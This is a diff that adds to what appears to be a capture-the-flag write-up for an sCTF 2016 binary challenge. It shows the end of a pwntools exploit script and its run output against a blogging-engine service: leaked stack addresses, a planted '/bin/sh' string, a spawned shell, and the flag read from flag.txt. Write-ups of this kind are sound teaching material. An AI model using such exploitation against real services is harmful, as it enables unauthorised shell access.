@@ -268,6 +268,64 @@ print r.recvuntil("|\n+--------------------+\n")
 r.send("5\n")
 
 r.interactive()
+```
 
+Here's the output of the exploit:
 
+```
+# ./sploit.py
+[+] Opening connection to problems2.2016q1.sctf.io on port 1339: Done
++-------------------------------------------+
+| Welcome to the Universal Blogging Engine, |
+| your one-stop-shop for all blogging needs.|
++-------------------------------------------+
++--------------------+
+|       Options      |
+| [1] Write a post   |
+| [2] Edit a post    |
+| [3] List all posts |
+| [4] Print a post   |
+| [5] Quit           |
++--------------------+
+
+Your name:
+Title:
+Contents:
+Thread successfully added!
+.
+.
+.
+ID      : 12
+Poster  : AAAA
+Title   : BBBB
+Contents: CCCCDDDDE/bin/sh
+Next    : 0xbf9b4129
+
+ID      : 13
+Poster  : AAAA
+Title   : BBBB
+Contents: CCCCDDDDE/bin/sh
+Next    : 0xbf9b41a2
+
+ID      : 14
+Poster  : AAAA
+Title   : BBBB
+Content
+stack address: 0xbf9b3b7d
+return to main at: 0xbf9bcc8c
+our buffer will go at: 0xbf9bcc34
+/bin/sh string: 0xbf9b3b72
+s: CCCCDDDDE/bin/sh
+Next    : 0xbf9b421b
+.
+.
+.
+[*] Switching to interactive mode
+$ id
+uid=1002(pwn3) gid=1002(pwn3) groups=1002(pwn3)
+$ ls
+flag.txt
+pwn3
+$ cat flag.txt
+sctf{h34p_0n_th3_st4ck_EZPZ}
 ```
